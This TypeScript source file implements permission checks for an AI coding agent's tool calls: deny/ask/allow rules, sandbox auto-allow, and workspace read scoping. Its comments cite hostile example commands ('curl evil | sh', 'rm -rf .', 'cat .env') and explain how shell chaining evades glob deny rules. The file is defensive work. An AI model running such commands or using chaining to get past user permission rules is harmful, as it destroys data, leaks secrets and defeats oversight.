import { realpathSync } from 'fs';
import { isAbsolute, join, relative } from 'path';
import type { ResolvedSettings } from './settings.js';
import type {
  PermissionDecision,
  PermissionResult,
  ReadOnlyRoot,
  ToolCall,
} from './types/tools.js';
import { canonicalToolName } from './tools/aliases.js';
import { getPrimaryArg } from './tools/primary-arg.js';
import { globToRegex } from './tools/glob-regex.js';
import { parsePatch, type PatchOperation } from './tools/patch.js';
import { resolveReadablePath, resolveWorkspacePath } from './tools/path-utils.js';
import { sandboxCoverage } from './sandbox.js';

/**
 * Parse a permission rule string like "Bash(git *)" or "Read(./.env)" into
 * { toolName, pattern }. The pattern is a glob matched against the tool's
 * primary argument. A bare "Tool" (no parens) means match any argument.
 * Empty parens "Tool()" also means match any argument.
 */
export interface ParsedRule {
  toolName: string;
  /** Glob pattern for the primary argument, or null for match-all. */
  pattern: string | null;
}

export interface PermissionVerdict {
  decision: 'allow' | 'deny' | 'ask';
  matchedRule?: string;
  source?: 'allow' | 'deny' | 'ask' | 'default' | 'sandbox' | 'workspace';
  /**
   * Set on the default ask for a Read, Glob or Grep whose target the tool itself refuses (outside
   * the workspace, and for Read outside Book's memory directory too): no approval can make it
   * work. Only judged where reads are auto-allowed.
   */
  outsideWorkspace?: boolean;
}

/** The workspace a call's path arguments are judged against (#264). */
export interface WorkspaceScope {
  /** The workspace root, as the file tools resolve paths against it. */
  root: string;
  /** The root after following links, when the caller has resolved it once; resolved here if not. */
  realRoot?: string;
  /**
   * Directories outside the workspace that the Read tool may open (Book's memory directory),
   * exactly as `ToolContext.readOnlyRoots`, so a Read is judged by the rule the tool applies.
   */
  readOnlyRoots?: readonly (string | ReadOnlyRoot)[];
  /**
   * Whether to judge what a Read, Glob or Grep reaches at all: true in the modes that prompt for
   * them (`WORKSPACE_READ_AUTO_ALLOW_MODES`), so a refusal can say when no approval could help.
   */
  judgeReads: boolean;
  /**
   * Whether a target the tool can serve runs without a prompt. Takes effect only with
   * `judgeReads`; false for a workspace that holds a home directory.
   */
  autoAllowReads: boolean;
}

/**
 * Seams for permission evaluation. `sandboxBackendAvailable` exists so tests can
 * exercise the missing-bwrap branch on a host that has bwrap installed; nothing
 * in production passes it. `workspace` is the scope a call's paths are judged in.
 */
export interface PermissionEvaluationOptions {
  sandboxBackendAvailable?: () => boolean;
  workspace?: WorkspaceScope;
}

/** Read-only file tools whose targets inside the workspace need no prompt (#264). */
const WORKSPACE_READ_TOOLS: ReadonlySet<string> = new Set(['Read', 'Glob', 'Grep']);

/** Tools whose rules name one file path, so a rule must match the file however it is spelled. */
const PATH_RULE_TOOLS: ReadonlySet<string> = new Set([
  'Read',
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
]);

/** Permission modes in which a workspace read runs without a prompt (#264). */
export const WORKSPACE_READ_AUTO_ALLOW_MODES: ReadonlySet<string> = new Set([
  'default',
  'accept-edits',
]);

export function parseRule(rule: string): ParsedRule {
  const parenIdx = rule.indexOf('(');
  if (parenIdx === -1) {
    return { toolName: rule.trim(), pattern: null };
  }
  const toolName = rule.slice(0, parenIdx).trim();
  const closeIdx = rule.lastIndexOf(')');
  if (closeIdx === -1 || closeIdx <= parenIdx) {
    // Malformed — treat as bare tool name.
    return { toolName, pattern: null };
  }
  const pattern = rule.slice(parenIdx + 1, closeIdx).trim();
  return { toolName, pattern: pattern.length === 0 ? null : pattern };
}

/**
 * Normalize a path-like string for matching: strip leading `./` so that
 * `./.env` and `.env` are equivalent. Non-path args (commands, queries)
 * pass through unchanged.
 */
function normalizePathArg(s: string): string {
  if (s.startsWith('./')) return s.slice(2);
  return s;
}

/**
 * Check whether a parsed rule matches a tool call. Both the rule pattern
 * and the primary argument are path-normalized (leading `./` stripped) for
 * Read/Write/Edit-style tools so `Read(./.env)` matches a call with
 * `filePath: ".env"`.
 */
function toolNameMatchesRule(ruleToolName: string, toolName: string): boolean {
  if (ruleToolName === toolName) return true;
  if (!ruleToolName.startsWith('mcp__')) return false;
  const serverName = ruleToolName.slice('mcp__'.length);
  // A bare MCP server namespace (mcp__github) intentionally covers every
  // tool from that server. A full tool rule remains exact.
  return Boolean(
    serverName && !serverName.includes('__') && toolName.startsWith(`${ruleToolName}__`),
  );
}

function ruleMatches(rule: ParsedRule, toolName: string, primaryArg: string): boolean {
  if (!toolNameMatchesRule(rule.toolName, toolName)) return false;
  if (rule.pattern === null) return true; // match-all
  const normalizedArg = normalizePathArg(primaryArg);
  const normalizedPattern = rule.pattern.startsWith('./') ? rule.pattern.slice(2) : rule.pattern;
  return globToRegex(normalizedPattern).test(normalizedArg);
}

export function permissionRuleForToolCall(call: ToolCall): string {
  const toolName = canonicalToolName(call.name);
  const primaryArg = getPrimaryArg(call.arguments);
  if (toolName === 'WebSearch') return toolName;
  if (toolName === 'WebFetch' && primaryArg) {
    try {
      const url = new URL(primaryArg);
      return `${toolName}(${url.origin}/**)`;
    } catch {
      // An invalid URL must not widen into a tool-wide permission.
    }
  }
  return primaryArg ? `${toolName}(${primaryArg})` : toolName;
}

/**
 * Read an approver's answer, which may be a bare result or one naming a rule.
 *
 * Approvers that cannot widen a scope — the print-mode prompt, managed agents —
 * keep returning the string, so only the surface that offers the choice has to
 * know the richer shape exists.
 */
export function permissionResultOf(decision: PermissionResult | PermissionDecision) {
  return typeof decision === 'string' ? decision : decision.result;
}

/** The rule an approver picked, or `undefined` to derive it from the call. */
export function permissionRuleOf(
  decision: PermissionResult | PermissionDecision,
): string | undefined {
  return typeof decision === 'string' ? undefined : decision.rule;
}

/** Why an approver refused, when it says; see `PermissionDecision.reason`. */
export function permissionReasonOf(
  decision: PermissionResult | PermissionDecision,
): PermissionDecision['reason'] {
  return typeof decision === 'string' ? undefined : decision.reason;
}

/** How many rules the "Always allow" scope ladder may offer, exact included. */
const RULE_LADDER_MAX = 3;

/**
 * Shell characters that chain or redirect one command into another.
 *
 * A widened rule is a glob over the whole command string and `*` crosses
 * anything, so `Bash(npm *)` would also match `npm x && curl evil | sh`. Book
 * cannot express "and nothing else" in its glob language, so it declines to
 * offer a widened rule when the command it learned from is already a compound
 * one: the user would be generalizing from an example whose shape they cannot
 * see repeated.
 */
const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/**
 * Rules the "Always allow" button may write, narrowest first.
 *
 * The exact rule is always first and is what the button offers by default. For
 * a shell command it is also nearly useless: `Bash(npm run check)` matches that
 * byte sequence and nothing else, so a user who pressed "Always allow" to stop
 * being asked was asked again on the very next call. The remaining entries drop
 * one trailing token at a time — `npm run check` offers `npm run *` then
 * `npm *` — and the caller must show the pattern it is about to write, because
 * the difference between these is the whole decision.
 *
 * Only Bash gets a ladder. Paths are already reusable as written, and WebFetch
 * globs its own origin in {@link permissionRuleForToolCall}.
 */
export function permissionRuleLadder(call: ToolCall): string[] {
  const exact = permissionRuleForToolCall(call);
  if (canonicalToolName(call.name) !== 'Bash') return [exact];

  const command = getPrimaryArg(call.arguments).trim();
  if (!command || SHELL_CHAINING.test(command)) return [exact];

  const tokens = command.split(/\s+/);
  const ladder = [exact];
  for (let take = tokens.length - 1; take >= 1 && ladder.length < RULE_LADDER_MAX; take -= 1) {
    const prefix = `Bash(${tokens.slice(0, take).join(' ')} *)`;
    if (!ladder.includes(prefix)) ladder.push(prefix);
  }
  return ladder;
}

export function permissionRuleMatchesCall(rule: string, call: ToolCall): boolean {
  const toolName = canonicalToolName(call.name);
  const primaryArg = getPrimaryArg(call.arguments);
  if (toolName === 'WebFetch' && primaryArg) {
    try {
      // URL.toString() gives origin roots a trailing slash, matching the remembered origin glob.
      return ruleMatches(parseRule(rule), toolName, new URL(primaryArg).toString());
    } catch {
      // Invalid URLs retain the normal raw-argument matching behavior.
    }
  }
  return ruleMatches(parseRule(rule), toolName, primaryArg);
}

function patchOperations(args: Record<string, unknown>): PatchOperation[] {
  const parsed = parsePatch(args.patch);
  return 'operations' in parsed ? parsed.operations : [];
}

function ruleMatchesPatch(rule: ParsedRule, paths: readonly string[]): boolean {
  return paths.some((path) => ruleMatches(rule, rule.toolName, path));
}

function patchRuleSupportsOperation(rule: ParsedRule, operation: PatchOperation): boolean {
  if (rule.toolName === 'ApplyPatch') return true;
  if (rule.toolName === 'Edit') return operation.kind === 'update';
  if (rule.toolName === 'Write') return operation.kind === 'update' || operation.kind === 'add';
  return false;
}

function compatiblePatchRuleMatches(
  rule: ParsedRule,
  operations: PatchOperation[],
  spellingsOf: (path: string) => readonly string[],
): boolean {
  if (!['ApplyPatch', 'Edit', 'Write'].includes(rule.toolName)) return false;
  if (rule.toolName === 'ApplyPatch' && rule.pattern === null) return true;
  return operations.some(
    (operation) =>
      patchRuleSupportsOperation(rule, operation) &&
      (rule.pattern === null || ruleMatchesPatch(rule, spellingsOf(operation.path))),
  );
}

/**
 * Extract the primary argument from a tool call for rule matching.
 * Delegates to the shared getPrimaryArg utility.
 */
export function primaryArgForRule(_toolName: string, args: Record<string, unknown>): string {
  return getPrimaryArg(args);
}

/**
 * Has the user asked to be consulted about anything at all?
 *
 * A shell command line is not a primary argument the way a file path is: one
 * line can read a file, write a file, reach the network, and chain three more
 * commands behind `&&`. A `deny` or `ask` glob therefore only ever matches the
 * shapes the user thought to write down — `deny: ["Bash(rm *)"]` does not match
 * `true && rm -rf .` — and it is the *default ask* underneath that catches
 * everything the glob missed, including the same action performed through a
 * different tool (`cat .env` against a `Read` deny, `curl` against a `WebFetch`
 * deny).
 *
 * So the presence of any hand-written deny/ask rule is treated as the user
 * saying "adjudicate my shell commands", and the default ask stays. Removing it
 * would turn every such rule from a floor into a list of exact strings to avoid.
 */
export function hasAdjudicationPolicy(settings: ResolvedSettings): boolean {
  return settings.permissions.deny.length > 0 || settings.permissions.ask.length > 0;
}

/**
 * Would `sandbox.autoAllowBashIfSandboxed` allow this call without a prompt?
 *
 * True only for a Bash call whose exact command text genuinely executes inside
 * a bubblewrap namespace. The command is read straight off `args.command` and
 * trimmed — byte-for-byte what `buildEffectiveCommand` in tools/shell.ts
 * matches against `excludedCommands` — rather than through `getPrimaryArg`,
 * which truncates to the first line. Judging a different string here than the
 * Bash tool judges is how "sandboxed, so auto-allow" and "excluded, so run it
 * on the host" end up applying to the same call.
 *
 * It is also true only when the user wrote no deny/ask rules at all
 * ({@link hasAdjudicationPolicy}). The bubblewrap namespace binds the workspace
 * read-write and shares the host network unless a domain policy is declared, so
 * "sandboxed" bounds the blast radius to the workspace — it does not make the
 * command harmless, and it is not a substitute for a prompt the user asked for.
 */
function sandboxAutoAllows(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions,
): boolean {
  if (!settings.sandbox.autoAllowBashIfSandboxed) return false;
  if (canonicalToolName(toolName) !== 'Bash') return false;
  if (hasAdjudicationPolicy(settings)) return false;
  const command = typeof args.command === 'string' ? args.command.trim() : '';
  if (!command) return false;
  return sandboxCoverage(command, settings.sandbox, options.sandboxBackendAvailable).sandboxed;
}

const toPosix = (value: string) => value.replace(/\\/g, '/');

/** The workspace root after following links, or `undefined` if it cannot be resolved. */
function realRootOf(scope: WorkspaceScope): string | undefined {
  if (scope.realRoot) return scope.realRoot;
  try {
    return realpathSync.native(scope.root);
  } catch {
    return undefined;
  }
}

/** The file path a path-rule tool acts on, read through the tool's own argument aliases. */
function pathArgument(toolName: string, args: Record<string, unknown>): string | undefined {
  const keys =
    toolName === 'NotebookEdit'
      ? ['notebook_path']
      : toolName === 'Read'
        ? ['filePath', 'file_path', 'path']
        : ['filePath', 'file_path'];
  for (const key of keys) {
    const value = args[key];
    if (typeof value === 'string' && value.trim() !== '') return value;
  }
  return undefined;
}

/**
 * Does any rule name this tool? Only then is a call's path worth resolving to its other
 * spellings: resolving touches the file system, and most calls meet no rule at all.
 */
function rulesName(settings: ResolvedSettings, toolName: string): boolean {
  const { deny, ask, allow } = settings.permissions;
  return [...deny, ...ask, ...allow].some((rule) => parseRule(rule).toolName === toolName);
}

/**
 * The other spellings of a target path that a rule may have been written against: relative to the
 * workspace (as written and after following links) and absolute, with forward slashes. Outside the
 * workspace, only Book's memory directory gets spellings, absolute ones, and only when
 * `readOnlyRoots` apply (a Read): the tools refuse everything else there.
 */
function spellingsOfPath(raw: string, scope: WorkspaceScope, readOnlyRoots: boolean): string[] {
  const spellings: string[] = [];
  const inWorkspace = resolveWorkspacePath(scope.root, raw);
  if (inWorkspace) {
    spellings.push(
      inWorkspace.relativePath,
      toPosix(inWorkspace.filePath),
      toPosix(inWorkspace.canonicalPath),
    );
    const realRoot = realRootOf(scope);
    if (realRoot) spellings.push(toPosix(relative(realRoot, inWorkspace.canonicalPath)));
  } else if (readOnlyRoots) {
    const readable = resolveReadablePath(
      { workspaceRoot: scope.root, readOnlyRoots: scope.readOnlyRoots },
      raw,
    );
    if (readable) spellings.push(toPosix(readable.filePath), toPosix(readable.canonicalPath));
  }
  return [...new Set(spellings)].filter((spelling) => spelling !== '' && spelling !== raw);
}

/** The other spellings of a path-rule tool's target; see `spellingsOfPath`. */
function pathRuleSpellings(
  toolName: string,
  args: Record<string, unknown>,
  scope: WorkspaceScope,
): string[] {
  const raw = pathArgument(toolName, args);
  return raw ? spellingsOfPath(raw, scope, toolName === 'Read') : [];
}

/** Characters that make a path segment a glob rather than a fixed name (`\x40` is the at sign). */
const GLOB_MAGIC = /[*?[\]{}()!+\x40]/;

/** The first brace group with a top-level comma, skipping escapes and groups without one. */
function firstBraceGroup(
  text: string,
): { start: number; end: number; alternatives: string[] } | undefined {
  for (let start = 0; start < text.length; start++) {
    if (text[start] === '\\') {
      start++;
      continue;
    }
    if (text[start] !== '{') continue;
    let depth = 0;
    let from = start + 1;
    const alternatives: string[] = [];
    for (let index = start; index < text.length; index++) {
      const char = text[index];
      if (char === '\\') {
        index++;
        continue;
      }
      if (char === '{') {
        depth++;
      } else if (char === '}') {
        depth--;
        if (depth === 0) {
          // `{x}` and the range `{1..3}` have no top-level comma: keep scanning inside them.
          if (alternatives.length === 0) break;
          alternatives.push(text.slice(from, index));
          return { start, end: index, alternatives };
        }
      } else if (char === ',' && depth === 1) {
        alternatives.push(text.slice(from, index));
        from = index + 1;
      }
    }
  }
  return undefined;
}

/**
 * The patterns a glob's brace groups expand to (`a{b,c}` becomes `ab` and `ac`), the way fast-glob
 * expands them before it walks; `undefined` when there would be more than `limit`.
 */
function expandBraces(pattern: string, limit = 64): string[] | undefined {
  const done: string[] = [];
  const pending = [pattern];
  while (pending.length > 0) {
    const current = pending.pop()!;
    const group = firstBraceGroup(current);
    if (!group) {
      done.push(current);
      if (done.length > limit) return undefined;
      continue;
    }
    for (const alternative of group.alternatives) {
      pending.push(current.slice(0, group.start) + alternative + current.slice(group.end + 1));
    }
    if (pending.length > limit) return undefined;
  }
  return done;
}

/**
 * Where a Glob pattern reaches: `outside` when any brace alternative climbs out (a `..` path
 * segment), starts at `~`, or starts at an absolute path outside the workspace; `servable`
 * otherwise. An absolute pattern is judged by its fixed leading segments. Two dots inside a file
 * name (`*..orig`) do not climb.
 */
function globTarget(pattern: string, scope: WorkspaceScope): 'servable' | 'outside' {
  const alternatives = expandBraces(pattern);
  if (!alternatives) return 'outside';
  for (const alternative of alternatives) {
    const segments = alternative.split(/[\\/]/);
    if (alternative.startsWith('~') || segments.includes('..')) return 'outside';
    if (isAbsolute(alternative) || /^[A-Za-z]:/.test(alternative)) {
      const fixed: string[] = [];
      for (const segment of segments) {
        if (GLOB_MAGIC.test(segment)) break;
        fixed.push(segment);
      }
      let base = fixed.join('/');
      if (base === '' || base.endsWith(':')) base += '/';
      if (!resolveWorkspacePath(scope.root, base)) return 'outside';
    }
  }
  return 'servable';
}

/**
 * Book's project-local settings file can carry an API key, and the `.book` directory holds it: a
 * Read or Grep aimed at either keeps asking. Compared on the canonical path, case-folded where the
 * file system folds case.
 */
function isBookLocalSettings(canonicalPath: string, scope: WorkspaceScope): boolean {
  const realRoot = realRootOf(scope);
  if (!realRoot) return false;
  const fold = (value: string) => (process.platform === 'linux' ? value : value.toLowerCase());
  const target = fold(canonicalPath);
  const bookDir = join(realRoot, '.book');
  return target === fold(bookDir) || target === fold(join(bookDir, 'settings.local.json'));
}

/**
 * What a Read, Glob or Grep call reaches, judged the way the tool judges it: `servable` (the tool
 * can serve it), `outside` (the tool refuses it), `guarded` (Book's own local settings, which keep
 * asking), or `none` (no target to judge; the tool rejects the call itself).
 */
function readToolTarget(
  toolName: string,
  args: Record<string, unknown>,
  scope: WorkspaceScope,
): 'servable' | 'outside' | 'guarded' | 'none' {
  if (toolName === 'Read') {
    const raw = pathArgument(toolName, args);
    if (!raw) return 'none';
    const match = resolveReadablePath(
      { workspaceRoot: scope.root, readOnlyRoots: scope.readOnlyRoots },
      raw,
    );
    if (!match) return 'outside';
    return isBookLocalSettings(match.canonicalPath, scope) ? 'guarded' : 'servable';
  }
  if (toolName === 'Glob') {
    const pattern = typeof args.pattern === 'string' ? args.pattern.trim() : '';
    if (!pattern) return 'none';
    return globTarget(pattern, scope);
  }
  // Grep: no path, or `.`, searches the workspace. Grep never reads Book's memory directory.
  const raw = typeof args.path === 'string' ? args.path.trim() : '';
  if (raw === '' || raw === '.') return 'servable';
  const match = resolveWorkspacePath(scope.root, raw);
  if (!match) return 'outside';
  return isBookLocalSettings(match.canonicalPath, scope) ? 'guarded' : 'servable';
}

/**
 * Has the user written a deny or ask rule about reading? A Grep or Glob reads files a `Read` rule
 * cannot see (`Grep` with `path: ".env"` returns every line), so while one exists they keep the
 * default prompt, the way `sandboxAutoAllows` steps aside for any adjudication policy.
 */
function hasReadAdjudication(settings: ResolvedSettings): boolean {
  const { deny, ask } = settings.permissions;
  return [...deny, ...ask].some((rule) => WORKSPACE_READ_TOOLS.has(parseRule(rule).toolName));
}

/**
 * Evaluate permission rules against a tool call. Rules are evaluated in
 * CC's order: deny → ask → allow. First match wins.
 *
 * Returns 'allow', 'deny', or 'ask' (the default when no rule matches).
 */
export function evaluatePermission(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions = {},
): 'allow' | 'deny' | 'ask' {
  return evaluatePermissionDetail(toolName, args, settings, options).decision;
}

export function evaluatePermissionDetail(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions = {},
): PermissionVerdict {
  const { deny, ask, allow } = settings.permissions;

  // ApplyPatch is the canonical mutation surface, but existing Edit/Write rules
  // remain valid for compatibility. A multi-file patch is allowed only when every
  // target is covered; a deny on any target wins.
  if (toolName === 'ApplyPatch') {
    const operations = patchOperations(args);
    // A Write or Edit rule applies however the patch spells the path (`src/../.env`, absolute).
    const scope = options.workspace;
    const spellings = new Map<string, readonly string[]>();
    const spellingsOf = (path: string): readonly string[] => {
      let known = spellings.get(path);
      if (!known) {
        known = scope ? [path, ...spellingsOfPath(path, scope, false)] : [path];
        spellings.set(path, known);
      }
      return known;
    };
    const compatible = (ruleStr: string) => {
      const rule = parseRule(ruleStr);
      return (
        rule.toolName === 'ApplyPatch' || rule.toolName === 'Edit' || rule.toolName === 'Write'
      );
    };
    for (const ruleStr of deny) {
      if (!compatible(ruleStr)) continue;
      const rule = parseRule(ruleStr);
      if (compatiblePatchRuleMatches(rule, operations, spellingsOf))
        return { decision: 'deny', matchedRule: ruleStr, source: 'deny' };
    }
    for (const ruleStr of ask) {
      if (!compatible(ruleStr)) continue;
      const rule = parseRule(ruleStr);
      if (compatiblePatchRuleMatches(rule, operations, spellingsOf))
        return { decision: 'ask', matchedRule: ruleStr, source: 'ask' };
    }
    const allowRules = allow.filter(compatible).map(parseRule);
    if (
      operations.length > 0 &&
      operations.every((operation) =>
        allowRules.some(
          (rule) =>
            patchRuleSupportsOperation(rule, operation) &&
            (rule.pattern === null || ruleMatchesPatch(rule, spellingsOf(operation.path))),
        ),
      )
    ) {
      return { decision: 'allow', matchedRule: allow.find(compatible), source: 'allow' };
    }
    if (allowRules.some((rule) => rule.toolName === 'ApplyPatch' && rule.pattern === null)) {
      return { decision: 'allow', matchedRule: allow.find(compatible), source: 'allow' };
    }
    return { decision: 'ask', source: 'default' };
  }

  const tool = canonicalToolName(toolName);
  const scope = options.workspace;
  const call: ToolCall = { id: 'permission-evaluation', name: toolName, arguments: args };
  // A rule about a file applies however the call spells its path: `Read(.env)` must also stop
  // `D:/ws/.env` and `src/../.env`, which the glob on the raw argument misses. Resolved only when
  // a rule names the tool, since resolving touches the file system.
  const respelled =
    scope && PATH_RULE_TOOLS.has(tool) && rulesName(settings, tool)
      ? pathRuleSpellings(tool, args, scope).map((spelling): ToolCall => ({
          ...call,
          arguments: { ...args, filePath: spelling },
        }))
      : [];
  const ruleMatches = (ruleStr: string) =>
    permissionRuleMatchesCall(ruleStr, call) ||
    respelled.some((candidate) => permissionRuleMatchesCall(ruleStr, candidate));
  // What a Read, Glob or Grep reaches, judged only in the modes that prompt for them, so a
  // refusal can say when no approval could make the tool serve it.
  const readTarget =
    scope?.judgeReads && WORKSPACE_READ_TOOLS.has(tool)
      ? readToolTarget(tool, args, scope)
      : undefined;
  const outside = readTarget === 'outside' ? { outsideWorkspace: true as const } : {};

  // Deny rules first.
  for (const ruleStr of deny) {
    if (ruleMatches(ruleStr)) {
      return { decision: 'deny', matchedRule: ruleStr, source: 'deny' };
    }
  }

  // Ask rules second.
  for (const ruleStr of ask) {
    if (ruleMatches(ruleStr)) {
      return { decision: 'ask', matchedRule: ruleStr, source: 'ask', ...outside };
    }
  }

  // Allow rules third.
  for (const ruleStr of allow) {
    if (ruleMatches(ruleStr)) {
      return { decision: 'allow', matchedRule: ruleStr, source: 'allow' };
    }
  }

  // `sandbox.autoAllowBashIfSandboxed` is evaluated last, and only in place of
  // the *default* ask. Every user-written rule outranks it: a matching `deny`
  // has already returned above and can never be softened into an allow (the
  // property the hard-deny check in the agent loop depends on), a matching
  // `ask` still prompts, and — because a shell line evades globs far too easily
  // — a deny/ask list that exists but did not match keeps the default ask too.
  // The setting only removes the prompt Book raises when the user configured no
  // adjudication at all, and only for a command really confined by bubblewrap.
  if (sandboxAutoAllows(toolName, args, settings, options)) {
    return { decision: 'allow', source: 'sandbox' };
  }

  // Reading or searching what the tool can serve needs no prompt in the modes that would
  // otherwise ask (#264). Every user-written rule outranks it: deny and ask returned above.
  if (
    scope?.autoAllowReads &&
    readTarget === 'servable' &&
    (tool === 'Read' || !hasReadAdjudication(settings))
  ) {
    return { decision: 'allow', source: 'workspace' };
  }
  if (readTarget === 'outside') {
    return { decision: 'ask', source: 'default', outsideWorkspace: true };
  }

  if (ALWAYS_ALLOWED_TOOLS.has(canonicalToolName(toolName))) {
    return { decision: 'allow', source: 'default' };
  }

  // No rule matched — default to asking.
  return { decision: 'ask', source: 'default' };
}

export const ALWAYS_ALLOWED_TOOLS = new Set(['MemorySave']);
